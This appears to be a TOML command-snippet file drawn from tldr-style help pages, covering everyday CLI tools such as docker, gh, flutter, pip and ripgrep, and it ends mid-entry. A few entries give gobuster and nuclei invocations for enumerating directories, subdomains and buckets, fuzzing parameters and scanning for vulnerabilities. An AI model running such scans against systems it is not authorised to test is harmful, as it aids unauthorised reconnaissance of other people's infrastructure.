  description = "Enter an interactive shell session on an already-running container"
  command = "docker exec --interactive --tty <container_name> </bin/bash>"
  output = ""

[[snippets]]
  description = "Run a command in the background (detached) on a running container"
  command = "docker exec --detach <container_name> <command>"
  output = ""

[[snippets]]
  description = "Select the working directory for a given command to execute into"
  command = "docker exec --interactive --tty --workdir <path/to/directory> <container_name> <command>"
  output = ""

[[snippets]]
  description = "Run a command in background on existing container but keep `stdin` open"
  command = "docker exec --interactive --detach <container_name> <command>"
  output = ""

[[snippets]]
  description = "Set an environment variable in a running Bash session"
  command = "docker exec --interactive --tty --env <variable_name>=<value> <container_name> </bin/bash>"
  output = ""

[[snippets]]
  description = "Run a command as a specific user"
  command = "docker exec --user <user> <container_name> <command>"
  output = ""

[[snippets]]
  description = "Create a new Laravel Zero application"
  command = "laravel-zero new <name>"
  output = ""

[[snippets]]
  description = "Update the installer to the latest version"
  command = "laravel-zero self-update"
  output = ""

[[snippets]]
  description = "List the available installer commands"
  command = "laravel-zero list"
  output = ""

[[snippets]]
  description = "Display a list of available services"
  command = "takeout enable"
  output = ""

[[snippets]]
  description = "Enable a specific service"
  command = "takeout enable <name>"
  output = ""

[[snippets]]
  description = "Enable a specific service with the default parameters"
  command = "takeout enable --default <name>"
  output = ""

[[snippets]]
  description = "Display a list of enabled services"
  command = "takeout disable"
  output = ""

[[snippets]]
  description = "Disable a specific service"
  command = "takeout disable <name>"
  output = ""

[[snippets]]
  description = "Disable all services"
  command = "takeout disable --all"
  output = ""

[[snippets]]
  description = "Start a specific container"
  command = "takeout start <container_id>"
  output = ""

[[snippets]]
  description = "Stop a specific container"
  command = "takeout stop <container_id>"
  output = ""

[[snippets]]
  description = "Display the ASCII art and default fields"
  command = "pfetch"
  output = ""

[[snippets]]
  description = "Display only the ASCII art and color palette fields"
  command = "PF_INFO=""<ascii palette>"" pfetch"
  output = ""

[[snippets]]
  description = "Display all possible fields"
  command = "PF_INFO=""<ascii title os host kernel uptime pkgs memory shell editor wm de palette>"" pfetch"
  output = ""

[[snippets]]
  description = "Display a different username and hostname"
  command = "USER=""<user>"" HOSTNAME=""<hostname>"" pfetch"
  output = ""

[[snippets]]
  description = "Display without colors"
  command = "PF_COLOR=<0> pfetch"
  output = ""

[[snippets]]
  description = "Login to a Railway account"
  command = "railway login"
  output = ""

[[snippets]]
  description = "Link to an existing Project under a Railway account or team"
  command = "railway link <projectId>"
  output = ""

[[snippets]]
  description = "Create a new project"
  command = "railway init"
  output = ""

[[snippets]]
  description = "Run a local command using variables from the active environment"
  command = "railway run <cmd>"
  output = ""

[[snippets]]
  description = "Deploy the linked project directory (if running from a subdirectory, the project root is still deployed)"
  command = "railway up"
  output = ""

[[snippets]]
  description = "Open an interactive shell to a database"
  command = "railway connect"
  output = ""

[[snippets]]
  description = "Create a new project"
  command = "tmuxinator new <project>"
  output = ""

[[snippets]]
  description = "Edit a project"
  command = "tmuxinator edit <project>"
  output = ""

[[snippets]]
  description = "List projects"
  command = "tmuxinator list"
  output = ""

[[snippets]]
  description = "Start a tmux session based on project"
  command = "tmuxinator start <project>"
  output = ""

[[snippets]]
  description = "Stop a project's tmux session"
  command = "tmuxinator stop <project>"
  output = ""

[[snippets]]
  description = "List secret keys for the current repository"
  command = "gh secret list"
  output = ""

[[snippets]]
  description = "List secret keys for a specific organization"
  command = "gh secret list --org <organization>"
  output = ""

[[snippets]]
  description = "List secret keys for a specific repository"
  command = "gh secret list --repo <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Set a secret for the current repository (user will be prompted for the value)"
  command = "gh secret set <name>"
  output = ""

[[snippets]]
  description = "Set a secret from a file for the current repository"
  command = "gh secret set <name> < <path/to/file>"
  output = ""

[[snippets]]
  description = "Set an organization secret for specific repositories"
  command = "gh secret set <name> --org <organization> --repos <repository1,repository2>"
  output = ""

[[snippets]]
  description = "Remove a secret for the current repository"
  command = "gh secret remove <name>"
  output = ""

[[snippets]]
  description = "Remove a secret for a specific organization"
  command = "gh secret remove <name> --org <organization>"
  output = ""

[[snippets]]
  description = "Discover directories and files that match in the wordlist"
  command = "gobuster dir --url <https://example.com/> --wordlist <path/to/file>"
  output = ""

[[snippets]]
  description = "Discover subdomains"
  command = "gobuster dns --domain <example.com> --wordlist <path/to/file>"
  output = ""

[[snippets]]
  description = "Discover Amazon S3 buckets"
  command = "gobuster s3 --wordlist <path/to/file>"
  output = ""

[[snippets]]
  description = "Discover other virtual hosts on the server"
  command = "gobuster vhost --url <https://example.com/> --wordlist <path/to/file>"
  output = ""

[[snippets]]
  description = "Fuzz the value of a parameter"
  command = "gobuster fuzz --url <https://example.com/?parameter=FUZZ> --wordlist <path/to/file>"
  output = ""

[[snippets]]
  description = "Fuzz the name of a parameter"
  command = "gobuster fuzz --url <https://example.com/?FUZZ=value> --wordlist <path/to/file>"
  output = ""

[[snippets]]
  description = "Speak a phrase aloud"
  command = "espeak ""I like to ride my bike."""
  output = ""

[[snippets]]
  description = "Speak a file aloud"
  command = "espeak -f <path/to/file>"
  output = ""

[[snippets]]
  description = "Save output to a WAV audio file, rather than speaking it directly"
  command = "espeak -w <filename.wav> ""It's GNU plus Linux"""
  output = ""

[[snippets]]
  description = "Use a different voice"
  command = "espeak -v <voice>"
  output = ""

[[snippets]]
  description = "Display the commands history list with line numbers"
  command = "history"
  output = ""

[[snippets]]
  description = "Display the last 20 commands (in `zsh` it displays all commands starting from the 20th)"
  command = "history <20>"
  output = ""

[[snippets]]
  description = "Clear the commands history list (only for current `bash` shell)"
  command = "history -c"
  output = ""

[[snippets]]
  description = "Overwrite history file with history of current `bash` shell (often combined with `history -c` to purge history)"
  command = "history -w"
  output = ""

[[snippets]]
  description = "Delete the history entry at the specified offset"
  command = "history -d <offset>"
  output = ""

[[snippets]]
  description = "Display the releases for the current repository in JSON format"
  command = "gh api repos/:owner/:repo/releases"
  output = ""

[[snippets]]
  description = "Create a reaction for a specific issue"
  command = "gh api --header <Accept:application/vnd.github.squirrel-girl-preview+json> --raw-field '<content=+1>' <repos/:owner/:repo/issues/123/reactions>"
  output = ""

[[snippets]]
  description = "Display the result of a GraphQL query in JSON format"
  command = "gh api graphql --field <name=':repo'> --raw-field '<query>'"
  output = ""

[[snippets]]
  description = "Send a request using a custom HTTP method"
  command = "gh api --method <POST> <endpoint>"
  output = ""

[[snippets]]
  description = "Include the HTTP response headers in the output"
  command = "gh api --include <endpoint>"
  output = ""

[[snippets]]
  description = "Do not print the response body"
  command = "gh api --silent <endpoint>"
  output = ""

[[snippets]]
  description = "Send a request to a specific GitHub Enterprise Server"
  command = "gh api --hostname <github.example.com> <endpoint>"
  output = ""

[[snippets]]
  description = "Display the subcommand help"
  command = "gh api --help"
  output = ""

[[snippets]]
  description = "Lookup the IP(s) associated with a hostname (A records)"
  command = "dog <example.com>"
  output = ""

[[snippets]]
  description = "Query the MX records type associated with a given domain name"
  command = "dog <example.com> MX"
  output = ""

[[snippets]]
  description = "Specify a specific DNS server to query (e.g. Cloudflare)"
  command = "dog <example.com> MX @<1.1.1.1>"
  output = ""

[[snippets]]
  description = "Query over TCP rather than UDP"
  command = "dog <example.com> MX @<1.1.1.1> --tcp"
  output = ""

[[snippets]]
  description = "Query the MX records type associated with a given domain name over TCP using explicit arguments"
  command = "dog --query <example.com> --type MX --nameserver <1.1.1.1> --tcp"
  output = ""

[[snippets]]
  description = "Lookup the IP(s) associated with a hostname (A records) using DNS over HTTPS (DoH)"
  command = "dog <example.com> --https @<https://cloudflare-dns.com/dns-query>"
  output = ""

[[snippets]]
  description = "List your events for all your calendars over the next 7 days"
  command = "gcalcli agenda"
  output = ""

[[snippets]]
  description = "Show events starting from or between specific dates (also takes relative dates e.g. "tomorrow")"
  command = "gcalcli agenda <mm/dd> [<mm/dd>]"
  output = ""

[[snippets]]
  description = "List events from a specific calendar"
  command = "gcalcli --calendar <calendar_name> agenda"
  output = ""

[[snippets]]
  description = "Display an ASCII calendar of events by week"
  command = "gcalcli calw"
  output = ""

[[snippets]]
  description = "Display an ASCII calendar of events for a month"
  command = "gcalcli calm"
  output = ""

[[snippets]]
  description = "Quick-add an event to your calendar"
  command = "gcalcli --calendar <calendar_name> quick ""<mm/dd> <HH:MM> <event_name>"""
  output = ""

[[snippets]]
  description = "Add an event to calendar. Triggers interactive prompt"
  command = "gcalcli --calendar ""<calendar_name>"" add"
  output = ""

[[snippets]]
  description = "Initialize a new Flutter project in a directory of the same name"
  command = "flutter create <project_name>"
  output = ""

[[snippets]]
  description = "Check if all external tools are correctly installed"
  command = "flutter doctor"
  output = ""

[[snippets]]
  description = "List or change Flutter channel"
  command = "flutter channel <stable|beta|dev|master>"
  output = ""

[[snippets]]
  description = "Run Flutter on all started emulators and connected devices"
  command = "flutter run -d all"
  output = ""

[[snippets]]
  description = "Run tests in a terminal from the root of the project"
  command = "flutter test <test/example_test.dart>"
  output = ""

[[snippets]]
  description = "Build a release APK targeting most modern smartphones"
  command = "flutter build apk --target-platform <android-arm>,<android-arm64>"
  output = ""

[[snippets]]
  description = "Display help about a specific command"
  command = "flutter help <command>"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "view <path/to/file>"
  output = ""

[[snippets]]
  description = "Send a message with the content of `message.txt` to the mail directory of local user `username`"
  command = "sendmail <username> < <message.txt>"
  output = ""

[[snippets]]
  description = "Send an email from you@yourdomain.com (assuming the mail server is configured for this) to test@gmail.com containing the message in `message.txt`"
  command = "sendmail -f <you@yourdomain.com> <test@gmail.com> < <message.txt>"
  output = ""

[[snippets]]
  description = "Send an email from you@yourdomain.com (assuming the mail server is configured for this) to test@gmail.com containing the file `file.zip`"
  command = "sendmail -f <you@yourdomain.com> <test@gmail.com> < <file.zip>"
  output = ""

[[snippets]]
  description = "Apply taint to a node"
  command = "kubectl taint nodes <node_name> <label_key>=<label_value>:<effect>"
  output = ""

[[snippets]]
  description = "Remove taint from a node"
  command = "kubectl taint nodes <node_name> <label_key>:<effect>-"
  output = ""

[[snippets]]
  description = "Remove all taints from a node"
  command = "kubectl taint nodes <node_name> <label_key>-"
  output = ""

[[snippets]]
  description = "Show all references in the default remote repository"
  command = "git ls-remote"
  output = ""

[[snippets]]
  description = "Show only heads references in the default remote repository"
  command = "git ls-remote --heads"
  output = ""

[[snippets]]
  description = "Show only tags references in the default remote repository"
  command = "git ls-remote --tags"
  output = ""

[[snippets]]
  description = "Show all references from a remote repository based on name or URL"
  command = "git ls-remote <repository_url>"
  output = ""

[[snippets]]
  description = "Show references from a remote repository filtered by a pattern"
  command = "git ls-remote <repository_name> ""<pattern>"""
  output = ""

[[snippets]]
  description = "Scan a specific file for viruses"
  command = "vt scan file <path/to/file>"
  output = ""

[[snippets]]
  description = "Scan a URL for viruses"
  command = "vt scan url <url>"
  output = ""

[[snippets]]
  description = "Display information from a specific analysis"
  command = "vt analysis <file_id|analysis_id>"
  output = ""

[[snippets]]
  description = "Download files in encrypted `.zip` format (requires premium account)"
  command = "vt download <file_id> --output <path/to/directory> --zip --zip-password <password>"
  output = ""

[[snippets]]
  description = "Initialize or re-initialize `vt` to enter API key interactively"
  command = "vt init"
  output = ""

[[snippets]]
  description = "Display information about a domain"
  command = "vt domain <url>"
  output = ""

[[snippets]]
  description = "Display information for a specific URL"
  command = "vt url <url>"
  output = ""

[[snippets]]
  description = "Display information for a specific IP address"
  command = "vt domain <ip_address>"
  output = ""

[[snippets]]
  description = "Render an image or animated GIF"
  command = "viu <path/to/file>"
  output = ""

[[snippets]]
  description = "Render an image or GIF from the internet using `curl`"
  command = "curl -s <https://example.com/image.png> | viu -"
  output = ""

[[snippets]]
  description = "Render an image with a transparent background"
  command = "viu -t <path/to/file>"
  output = ""

[[snippets]]
  description = "Render an image with a specific width and height in pixels"
  command = "viu -w <width> -h <height> <path/to/file>"
  output = ""

[[snippets]]
  description = "Render an image or GIF and display its file name"
  command = "viu -n <path/to/file>"
  output = ""

[[snippets]]
  description = "Generate a test pattern for printing onto US standard paper"
  command = "pbmpage > <path/to/file.pbm>"
  output = ""

[[snippets]]
  description = "Generate a test pattern for printing onto A4 paper"
  command = "pbmpage -a4 > <path/to/file.pbm>"
  output = ""

[[snippets]]
  description = "Specify the pattern to use"
  command = "pbmpage <1|2|3> > <path/to/file.pbm>"
  output = ""

[[snippets]]
  description = "Generate a new initial TypeORM project structure"
  command = "typeorm init"
  output = ""

[[snippets]]
  description = "Create an empty migration file"
  command = "typeorm migration:create --name <migration_name>"
  output = ""

[[snippets]]
  description = "Create a migration file with the SQL statements to update the schema"
  command = "typeorm migration:generate --name <migration_name>"
  output = ""

[[snippets]]
  description = "Run all pending migrations"
  command = "typeorm migration:run"
  output = ""

[[snippets]]
  description = "Create a new entity file in a specific directory"
  command = "typeorm entity:create --name <entity> --dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display the SQL statements to be executed by `typeorm schema:sync` on the default connection"
  command = "typeorm schema:log"
  output = ""

[[snippets]]
  description = "Execute a specific SQL statement on the default connection"
  command = "typeorm query <sql_sentence>"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "typeorm <subcommand> --help"
  output = ""

[[snippets]]
  description = "Listen on all interfaces (`0.0.0.0`) and port `8080`"
  command = "xsp"
  output = ""

[[snippets]]
  description = "Listen on a specific IP address and port"
  command = "xsp --address <127.0.0.1> --port <8000>"
  output = ""

[[snippets]]
  description = "Check if an IP address is allowed to send an e-mail from the specified e-mail address"
  command = "spfquery -ip <8.8.8.8> -sender <sender@example.com>"
  output = ""

[[snippets]]
  description = "Turn on debugging output"
  command = "spfquery -ip <8.8.8.8> -sender <sender@example.com> --debug"
  output = ""

[[snippets]]
  description = "Run a command using a given Rust toolchain (see `rustup help toolchain` for more information)"
  command = "rustup run <toolchain> <command>"
  output = ""

[[snippets]]
  description = "Clear the screen (equivalent to pressing Control-L in Bash shell)"
  command = "clear"
  output = ""

[[snippets]]
  description = "Clear the screen but keep the terminal's scrollback buffer"
  command = "clear -x"
  output = ""

[[snippets]]
  description = "Indicate the type of terminal to clean (defaults to the value of the environment variable `TERM`)"
  command = "clear -T <type_of_terminal>"
  output = ""

[[snippets]]
  description = "Display the version of `ncurses` used by `clear`"
  command = "clear -V"
  output = ""

[[snippets]]
  description = "Create TSLint config"
  command = "tslint --init"
  output = ""

[[snippets]]
  description = "Lint on a given set of files"
  command = "tslint <path/to/file1.js path/to/file2.js ...>"
  output = ""

[[snippets]]
  description = "Fix lint issues"
  command = "tslint --fix"
  output = ""

[[snippets]]
  description = "Lint with the configuration file in the project root"
  command = "tslint --project <path/to/project_root>"
  output = ""

[[snippets]]
  description = "View documentation for `pnmquant`"
  command = "tldr pnmquant"
  output = ""

[[snippets]]
  description = "View documentation for `pnmremap`"
  command = "tldr pnmremap"
  output = ""

[[snippets]]
  description = "Activate the configuration defined in `~/.config/nixpkgs/home.nix`"
  command = "home-manager build"
  output = ""

[[snippets]]
  description = "Activate the configuration and switch to it"
  command = "home-manager switch"
  output = ""

[[snippets]]
  description = "Create a backup (user will be prompted for a password)"
  command = "mysqldump --user <user> --password <database_name> --result-file=<path/to/file.sql>"
  output = ""

[[snippets]]
  description = "Backup a specific table redirecting the output to a file (user will be prompted for a password)"
  command = "mysqldump --user <user> --password <database_name> <table_name> > <path/to/file.sql>"
  output = ""

[[snippets]]
  description = "Backup all databases redirecting the output to a file (user will be prompted for a password)"
  command = "mysqldump --user <user> --password --all-databases > <path/to/file.sql>"
  output = ""

[[snippets]]
  description = "Backup all databases from a remote host, redirecting the output to a file (user will be prompted for a password)"
  command = "mysqldump --host=<ip_or_hostname> --user <user> --password --all-databases > <path/to/file.sql>"
  output = ""

[[snippets]]
  description = "Convert a PPM image to a PCX file"
  command = "ppmtopcx <path/to/file.ppm> > <path/to/file.pcx>"
  output = ""

[[snippets]]
  description = "Produce a PCX file with the specified color depth"
  command = "ppmtopcx -<8bit|24bit> <path/to/file.ppm> > <path/to/file.pcx>"
  output = ""

[[snippets]]
  description = "Load a Docker image from `stdin`"
  command = "docker load < <path/to/image_file.tar>"
  output = ""

[[snippets]]
  description = "Load a Docker image from a specific file"
  command = "docker load --input <path/to/image_file.tar>"
  output = ""

[[snippets]]
  description = "Load a Docker image from a specific file in quiet mode"
  command = "docker load --quiet --input <path/to/image_file.tar>"
  output = ""

[[snippets]]
  description = "Display data about a Git repository"
  command = "git summary"
  output = ""

[[snippets]]
  description = "Display data about a Git repository since a commit-ish"
  command = "git summary <commit|branch_name|tag_name>"
  output = ""

[[snippets]]
  description = "Display data about a Git repository, merging committers using different emails into 1 statistic for each author"
  command = "git summary --dedup-by-email"
  output = ""

[[snippets]]
  description = "Display data about a Git repository, showing the number of lines modified by each contributor"
  command = "git summary --line"
  output = ""

[[snippets]]
  description = "Install a package, automatically installing dependencies"
  command = "raco pkg install --auto <package_source>"
  output = ""

[[snippets]]
  description = "Install the current directory as a package"
  command = "raco pkg install"
  output = ""

[[snippets]]
  description = "Build (or rebuild) bytecode, documentation, executables, and metadata indexes for collections"
  command = "raco setup <collection1 collection2 ...>"
  output = ""

[[snippets]]
  description = "Run tests in files"
  command = "raco test <path/to/tests1.rkt path/to/tests2.rkt ...>"
  output = ""

[[snippets]]
  description = "Search local documentation"
  command = "raco docs <search_terms ...>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "raco help"
  output = ""

[[snippets]]
  description = "Recursively search the current directory for a regular expression"
  command = "rg <regular_expression>"
  output = ""

[[snippets]]
  description = "Search for regular expressions recursively in the current directory, including hidden files and files listed in `.gitignore`"
  command = "rg --no-ignore --hidden <regular_expression>"
  output = ""

[[snippets]]
  description = "Search for a regular expression only in a subset of directories"
  command = "rg <regular_expression> <set_of_subdirs>"
  output = ""

[[snippets]]
  description = "Search for a regular expression in files matching a glob (e.g. `README.*`)"
  command = "rg <regular_expression> --glob <glob>"
  output = ""

[[snippets]]
  description = "Search for filenames that match a regular expression"
  command = "rg --files | rg <regular_expression>"
  output = ""

[[snippets]]
  description = "Only list matched files (useful when piping to other commands)"
  command = "rg --files-with-matches <regular_expression>"
  output = ""

[[snippets]]
  description = "Show lines that do not match the given regular expression"
  command = "rg --invert-match <regular_expression>"
  output = ""

[[snippets]]
  description = "Search a literal string pattern"
  command = "rg --fixed-strings -- <string>"
  output = ""

[[snippets]]
  description = "List packages"
  command = "go list ./..."
  output = ""

[[snippets]]
  description = "List standard packages"
  command = "go list std"
  output = ""

[[snippets]]
  description = "List packages in JSON format"
  command = "go list -json time net/http"
  output = ""

[[snippets]]
  description = "List module dependencies and available updates"
  command = "go list -m -u all"
  output = ""

[[snippets]]
  description = "List models"
  command = "openai api models.list"
  output = ""

[[snippets]]
  description = "Create a completion"
  command = "openai api completions.create --model <ada> --prompt <""Hello world"">"
  output = ""

[[snippets]]
  description = "Create a chat completion"
  command = "openai api chat_completions.create --model <gpt-3.5-turbo> --message <user ""Hello world"">"
  output = ""

[[snippets]]
  description = "Generate images via DALL·E API"
  command = "openai api image.create --prompt <""two dogs playing chess, cartoon""> --num-images <1>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker inspect"
  output = ""

[[snippets]]
  description = "Display information about a container, image, or volume using a name or ID"
  command = "docker inspect <container|image|ID>"
  output = ""

[[snippets]]
  description = "Display a container's IP address"
  command = "docker inspect --format '\{\{range.NetworkSettings.Networks\}\}\{\{.IPAddress\}\}\{\{end\}\}' <container>"
  output = ""

[[snippets]]
  description = "Display the path to the container's log file"
  command = "docker inspect --format='\{\{.LogPath\}\}' <container>"
  output = ""

[[snippets]]
  description = "Display the image name of the container"
  command = "docker inspect --format='\{\{.Config.Image\}\}' <container>"
  output = ""

[[snippets]]
  description = "Display the configuration information as JSON"
  command = "docker inspect --format='\{\{json .Config\}\}' <container>"
  output = ""

[[snippets]]
  description = "Display all port bindings"
  command = "docker inspect --format='\{\{range $p, $conf := .NetworkSettings.Ports\}\} \{\{$p\}\} -> \{\{(index $conf 0).HostPort\}\} \{\{end\}\}' <container>"
  output = ""

[[snippets]]
  description = "Test if a given variable is equal/not equal to the specified string"
  command = "[ ""$<variable>"" <=|!=> ""<string>"" ]"
  output = ""

[[snippets]]
  description = "Test if a given variable is [eq]ual/[n]ot [e]qual/[g]reater [t]han/[l]ess [t]han/[g]reater than or [e]qual/[l]ess than or [e]qual to the specified number"
  command = "[ ""$<variable>"" -<eq|ne|gt|lt|ge|le> <integer> ]"
  output = ""

[[snippets]]
  description = "Test if the specified variable has a [n]on-empty value"
  command = "[ -n ""$<variable>"" ]"
  output = ""

[[snippets]]
  description = "Test if the specified variable has an empty value"
  command = "[ -z ""$<variable>"" ]"
  output = ""

[[snippets]]
  description = "Test if the specified [f]ile exists"
  command = "[ -f <path/to/file> ]"
  output = ""

[[snippets]]
  description = "Test if the specified [d]irectory exists"
  command = "[ -d <path/to/directory> ]"
  output = ""

[[snippets]]
  description = "Test if the specified file or directory [e]xists"
  command = "[ -e <path/to/file_or_directory> ]"
  output = ""

[[snippets]]
  description = "First import feed URLs from an OPML file"
  command = "newsboat -i <my-feeds.xml>"
  output = ""

[[snippets]]
  description = "Alternatively, add feeds manually"
  command = "echo <http://example.com/path/to/feed> >> ""${HOME}/.newsboat/urls"""
  output = ""

[[snippets]]
  description = "Start Newsboat and refresh all feeds on startup"
  command = "newsboat -r"
  output = ""

[[snippets]]
  description = "Execute one or more commands in non-interactive mode"
  command = "newsboat -x <reload print-unread ...>"
  output = ""

[[snippets]]
  description = "See keyboard shortcuts (the most relevant are visible in the status line)"
  command = "?"
  output = ""

[[snippets]]
  description = "Convert a PBM image to an Epson printer graphic"
  command = "pbmtoepson <path/to/image.pbm> > <path/to/output.epson>"
  output = ""

[[snippets]]
  description = "Specify the printer protocol of the output"
  command = "pbmtoepson -protocol <escp9|escp> <path/to/image.pbm> > <path/to/output.epson>"
  output = ""

[[snippets]]
  description = "Specify the horizontal DPI of the output"
  command = "pbmtoepson -dpi <60|72|80|90|120|144|240> <path/to/image.pbm> > <path/to/output.epson>"
  output = ""

[[snippets]]
  description = "Create a new `ern` application (`MiniApp`)"
  command = "ern create-miniapp <application_name>"
  output = ""

[[snippets]]
  description = "Run one or more `MiniApps` in the iOS/Android Runner application"
  command = "ern run-<ios|android>"
  output = ""

[[snippets]]
  description = "Create an Electrode Native container"
  command = "ern create-container --miniapps </path/to/miniapp_directory> --platform <ios|android>"
  output = ""

[[snippets]]
  description = "Publish an Electrode Native container to a local Maven repository"
  command = "ern publish-container --publisher <maven> --platform <android> --extra <'{""groupId"":""com.walmart.ern"",""artifactId"":""quickstart""}'>"
  output = ""

[[snippets]]
  description = "Transform an iOS container into a pre-compiled binary framework"
  command = "ern transform-container --platform <ios> --transformer <xcframework>"
  output = ""

[[snippets]]
  description = "List all installed versions of Electrode Native"
  command = "ern platform versions"
  output = ""

[[snippets]]
  description = "Set a logging level"
  command = "ern platform config set logLevel <trace|debug>"
  output = ""

[[snippets]]
  description = "List sessions"
  command = "abduco"
  output = ""

[[snippets]]
  description = "[A]ttach to a session, creating it if it doesn't exist"
  command = "abduco -A <name> <bash>"
  output = ""

[[snippets]]
  description = "[A]ttach to a session with `dvtm`, creating it if it doesn't exist"
  command = "abduco -A <name>"
  output = ""

[[snippets]]
  description = "Detach from a session"
  command = "<Ctrl> + \"
  output = ""

[[snippets]]
  description = "[A]ttach to a session in [r]ead-only mode"
  command = "abduco -Ar <name>"
  output = ""

[[snippets]]
  description = "Return the default config, and create it if it's the first time the program runs"
  command = "neofetch"
  output = ""

[[snippets]]
  description = "Trigger an info line from appearing in the output, where 'infoname' is the function name in the configuration file, e.g. memory"
  command = "neofetch --<enable|disable> <infoname>"
  output = ""

[[snippets]]
  description = "Hide/Show OS architecture"
  command = "neofetch --os_arch <on|off>"
  output = ""

[[snippets]]
  description = "Enable/Disable CPU brand in output"
  command = "neofetch --cpu_brand <on|off>"
  output = ""

[[snippets]]
  description = "Declare a string variable with the specified value"
  command = "declare <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Declare an integer variable with the specified value"
  command = "declare -i <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Declare an array variable with the specified value"
  command = "declare -a <variable>=(<item_a item_b item_c>)"
  output = ""

[[snippets]]
  description = "Declare an associative array variable with the specified value"
  command = "declare -A <variable>=(<[key_a]=item_a [key_b]=item_b [key_c]=item_c>)"
  output = ""

[[snippets]]
  description = "Declare a readonly string variable with the specified value"
  command = "declare -r <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Declare a global variable within a function with the specified value"
  command = "declare -g <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Recursively search starting in the current directory, ignoring case"
  command = "ned --ignore-case --recursive '<^[dl]og>' <.>"
  output = ""

[[snippets]]
  description = "Search always showing colored output"
  command = "ned --colors '<^[dl]og>' <.>"
  output = ""

[[snippets]]
  description = "Search never showing colored output"
  command = "ned --colors=never '<^[dl]og>' <.>"
  output = ""

[[snippets]]
  description = "Search ignoring certain files"
  command = "ned --recursive --exclude '<*.htm>' '<^[dl]og>' <.>"
  output = ""

[[snippets]]
  description = "Simple replace"
  command = "ned '<dog>' --replace '<cat>' <.>"
  output = ""

[[snippets]]
  description = "Replace using numbered group references"
  command = "ned '<the ([a-z]+) dog and the ([a-z]+) dog>' --replace '<the $2 dog and the $1 dog>' <.>"
  output = ""

[[snippets]]
  description = "Replace changing case"
  command = "ned '<([a-z]+) dog>' --case-replacements --replace '<\U$1\E! dog>' --stdout <.>"
  output = ""

[[snippets]]
  description = "Preview results of a find and replace without updating the target files"
  command = "ned '<^[sb]ad>' --replace '<happy>' --stdout <.>"
  output = ""

[[snippets]]
  description = "Register a repository"
  command = "mr register"
  output = ""

[[snippets]]
  description = "Update repositories in 5 concurrent jobs"
  command = "mr -j<5> update"
  output = ""

[[snippets]]
  description = "Print the status of all repositories"
  command = "mr status"
  output = ""

[[snippets]]
  description = "Checkout all repositories to the latest version"
  command = "mr checkout"
  output = ""

[[snippets]]
  description = "[u]pdate `nuclei` [t]emplates to the latest released version"
  command = "nuclei -ut"
  output = ""

[[snippets]]
  description = "[l]ist all [t]emplates with a specific [p]rotocol [t]ype"
  command = "nuclei -tl -pt <dns|file|http|headless|tcp|workflow|ssl|websocket|whois|code|javascript>"
  output = ""

[[snippets]]
  description = "Run an [a]utomatic web [s]can using wappalyzer technology detection specifying a target [u]RL/host to scan"
  command = "nuclei -as -u <scanme.nmap.org>"
  output = ""

[[snippets]]
  description = "Run HTTP [p]rotocol [t]ype templates of high and critical severity, [e]xporting results to [m]arkdown files inside a specific directory"
  command = "nuclei -severity high,critical -pt http -u <http://scanme.sh> -me <markdown_directory>"
  output = ""

[[snippets]]
  description = "Run all templates using a different [r]ate [l]imit and maximum [b]ulk [s]ize with silent output (only showing the findings)"
  command = "nuclei -rl <150> -bs <25> -c <25> -silent -u <http://scanme.sh>"
  output = ""

[[snippets]]
  description = "Run the WordPress [w]orkflow against a WordPress site"
  command = "nuclei -w <path/to/nuclei-templates/workflows/wordpress-workflow.yaml> -u <https://sample.wordpress.site>"
  output = ""

[[snippets]]
  description = "Run one or more specific [t]emplates or directory with [t]emplates with [v]erbose output in `stderr` and [o]utput detected issues/vulnerabilities to a file"
  command = "nuclei -t <path/to/nuclei-templates/http> -u <http://scanme.sh> -v -o <results>"
  output = ""

[[snippets]]
  description = "Run scan based on one or more [t]emplate [c]onditions"
  command = "nuclei -tc <""contains(tags, 'xss') && contains(tags, 'cve')""> -u <https://vulnerable.website>"
  output = ""

[[snippets]]
  description = "Build a package from nixpkgs, symlinking the result to `./result`"
  command = "nix build <nixpkgs#pkg>"
  output = ""

[[snippets]]
  description = "Build a package from a flake in the current directory, showing the build logs in the process"
  command = "nix build -L <.#pkg>"
  output = ""

[[snippets]]
  description = "Build the default package from a flake in some directory"
  command = "nix build <./path/to/directory>"
  output = ""

[[snippets]]
  description = "Build a package without making the `result` symlink, instead printing the store path to the `stdout`"
  command = "nix build --no-link --print-out-paths"
  output = ""

[[snippets]]
  description = "Provide feedback to the `gcloud` team"
  command = "gcloud feedback"
  output = ""

[[snippets]]
  description = "Provide feedback to the `gcloud` team and attach a log file"
  command = "gcloud feedback --log-file <log_file>"
  output = ""

[[snippets]]
  description = "Compile a DVI document"
  command = "tex <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a DVI document, specifying an output directory"
  command = "tex -output-directory=<path/to/directory> <source.tex>"
  output = ""

[[snippets]]
  description = "Compile a DVI document, exiting on each error"
  command = "tex -halt-on-error <source.tex>"
  output = ""

[[snippets]]
  description = "Install a package (see `pip install` for more install examples)"
  command = "pip install <package>"
  output = ""

[[snippets]]
  description = "Install a package to the user's directory instead of the system-wide default location"
  command = "pip install --user <package>"
  output = ""

[[snippets]]
  description = "Upgrade a package"
  command = "pip install --upgrade <package>"
  output = ""

[[snippets]]
  description = "Uninstall a package"
  command = "pip uninstall <package>"
  output = ""

[[snippets]]
  description = "Save installed packages to file"
  command = "pip freeze > <requirements.txt>"
  output = ""

[[snippets]]
  description = "Show installed package info"
  command = "pip show <package>"
  output = ""

[[snippets]]
  description = "Install packages from a file"
  command = "pip install --requirement <requirements.txt>"
  output = ""

[[snippets]]
  description = "Generate documentation and code from an OpenAPI/swagger file"
  command = "swagger-codegen generate -i <swagger_file> -l <language>"
  output = ""

[[snippets]]
  description = "Generate Java code using the library retrofit2 and the option useRxJava2"
  command = "swagger-codegen generate -i <http://petstore.swagger.io/v2/swagger.json> -l <java> --library <retrofit2> -D<useRxJava2>=<true>"
  output = ""

[[snippets]]
  description = "List available languages"
  command = "swagger-codegen langs"
  output = ""

[[snippets]]
  description = "Display help for a specific command"
  command = "swagger-codegen <generate|config-help|meta|langs|version> --help"
  output = ""

[[snippets]]
  description = "Render a `png` image with a filename based on the input filename and output format (uppercase -O)"
